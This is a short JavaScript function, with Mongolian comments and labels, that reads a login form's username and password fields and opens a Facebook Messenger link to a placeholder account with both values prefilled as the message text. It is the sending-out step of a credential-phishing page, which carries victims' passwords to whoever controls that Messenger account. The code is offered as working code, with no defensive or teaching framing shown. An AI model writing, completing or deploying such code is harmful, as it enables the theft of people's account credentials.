function sendToMessenger() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const message = `Нэвтрэх нэр: ${username}\nНууц үг: ${password}`;

    // Messenger руу илгээх URL
    const messengerUrl = `https://m.me/your-messenger-id?text=${encodeURIComponent(message)}`;

    // Шинэ таб нээнэ
    window.open(messengerUrl, '_blank');
}
